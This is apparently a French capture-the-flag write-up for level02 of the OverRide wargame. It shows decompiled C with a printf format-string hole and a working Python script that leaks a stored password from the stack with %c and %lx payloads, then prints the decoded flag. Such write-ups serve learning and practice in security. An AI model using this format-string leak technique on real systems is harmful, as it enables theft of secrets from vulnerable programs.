# OverRide : [level02]

### Observation :
En arrivant sur le level02 on trouve un exécutable nommé level02.\
Quand nous essayons de le lancer cela nous demande un nom d'utilisateur puis un mot de passe. \
Regardons donc avec gdb ou un decompilateur.

---

#### Source décompilée:
```c
//----- (0000000000400814) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s2[96]; // [rsp+10h] [rbp-110h] BYREF
  int v5; // [rsp+70h] [rbp-B0h]
  char ptr[48]; // [rsp+80h] [rbp-A0h] BYREF
  char s[96]; // [rsp+B0h] [rbp-70h] BYREF
  int v8; // [rsp+110h] [rbp-10h]
  int v9; // [rsp+114h] [rbp-Ch]
  FILE *stream; // [rsp+118h] [rbp-8h]

  memset(s, 0, sizeof(s));
  v8 = 0;
  memset(ptr, 0, 41);
  memset(s2, 0, sizeof(s2));
  v5 = 0;
  stream = 0LL;
  v9 = 0;
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1uLL, 0x24uLL, stderr);
    exit(1);
  }
  v9 = fread(ptr, 1uLL, 0x29uLL, stream);
  ptr[strcspn(ptr, "\n")] = 0;
  if ( v9 != 41 )
  {
    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
    exit(1);
  }
  fclose(stream);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(s, 100, stdin);
  s[strcspn(s, "\n")] = 0;
  printf("--[ Password: ");
  fgets(s2, 100, stdin);
  s2[strcspn(s2, "\n")] = 0;
  puts("*****************************************");
  if ( strncmp(ptr, s2, 0x29uLL) )
  {
    printf(s);
    puts(" does not have access!");
    exit(1);
  }
  printf("Greetings, %s!\n", s);
  system("/bin/sh");
  return 0;
}
```

#### Détails du programme:
```bash
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | Notre Programme, en 64bits, commence par ouvrir le fichier `/home/users/level03/.pass` et copie le contenu dans un string `ptr`, le programme nous demande par la suite notre nom d'utilisateur depuis `stdin` et le place dans la variable `<s>` (ce nom d'utilisateur sera printf plus tard). Il nous demande maintenant un mot de passe en `stdin` qu'il va ensuite comparer au `password` de `level03`. Dans le cas où nous aurions le bon mot de passe, cela nous ouvre un `shell` en tant que `level03` sinon ça nous print `"does not have access!"`|


#### Conclusions:
Nous savons que notre mot de passe est stoqué, dans la stack, dans la variable `<ptr>`. \
Nous savons que nous pouvons remonter dans la stack grâce à notre stdin de user qui est lu bêtement par printf.
> Effectivement printf utiliser de cette manière: "printf(s)" (sans argument) permet d'injecter des points d'injections (%s / %c / %n / ex..) qui nous permettent de remonter dans la stack.


----
Résolution:
----
Nous devons trouver ou dans la stack ou est stocker `<ptr>` et lire son contenu. \
Nous devons ensuite remonter de printf en faisant des points d'injections jusqu'à tomber sur `<ptr>` puis afficher chaque groupe de 8octets (nous sommes en 64bits) avec printf `%lx`. \
Ensuite, nous devons transformer chaque octets en caractère, cela nous donne ça:

>ptr brut (%lx * 5): "756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d"

>ptr décoder: "M9KfPg3HsXGnh5J5XgNWCqz7Q9sa5JAEHh74RPnu"

Malheureusement si on le test en mot de passe cela ne fonctionne pas...

La cause ? Nous sommes en little endian, il faudra donc retourner nos blocs de 8 octets un par un...

En commande python cela donne quelque chose comme ça:

> 756e505234376848 | 45414a3561733951 | 377a7143574e6758 | 354a35686e475873 | 48336750664b394d

```sh
python -c "print('\x75\x6e\x50\x52\x34\x37\x68\x48'[::-1] + '\x45\x41\x4a\x35\x61\x73\x39\x51'[::-1] + '\x37\x7a\x71\x43\x57\x4e\x67\x58'[::-1] + '\x35\x4a\x35\x68\x6e\x47\x58\x73'[::-1] + '\x48\x33\x67\x50\x66\x4b\x39\x4d'[::-1])"
```



#### Injection:
Mais ici, on fait dev, on ne fait pas les choses a la main donc on a fait directement un programme python qui fait absolument tout ce que j'ai dit précédemment: 
```python
import binascii
import os

def divide(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

stream = os.popen('echo ' + '%c'*21 + '%8.lx'*5 + ' | /home/users/level02/level02')
for i in range(6):
        output = stream.readline()
input_string = output[21:101:]
parts = divide(input_string, 16)
stringrev = ''.join(''.join(divide(part, 2)[::-1]) for part in parts)
print(binascii.unhexlify(stringrev).decode('utf-8'))
```
- Il pipe avant le programe avec `echo ' + '%c'*21 + '%8.lx'*5`
- Il lance le programe et recupere la derniere chaine de caracteres
- Il trouve les chiffres qui nous interressent 
- Il les met par blocs de 8 et les inversent
- Enfin il nous renvoient nous affiche notre mot de passe traduit en ASCII

#### Commande:
```bash
python -c "print('\x75\x6e\x50\x52\x34\x37\x68\x48'[::-1] + '\x45\x41\x4a\x35\x61\x73\x39\x51'[::-1] + '\x37\x7a\x71\x43\x57\x4e\x67\x58'[::-1] + '\x35\x4a\x35\x68\x6e\x47\x58\x73'[::-1] + '\x48\x33\x67\x50\x66\x4b\x39\x4d'[::-1])"

----------------------------------------------------------------------------

python -c"
import binascii
import os

def divide(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

stream = os.popen('echo ' + '%c'*21 + '%8.lx'*5 + ' | /home/users/level02/level02')
for i in range(6):
        output = stream.readline()
input_string = output[21:101:]
parts = divide(input_string, 16)
stringrev = ''.join(''.join(divide(part, 2)[::-1]) for part in parts)
print(binascii.unhexlify(stringrev).decode('utf-8'))"
```

#### Flag: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
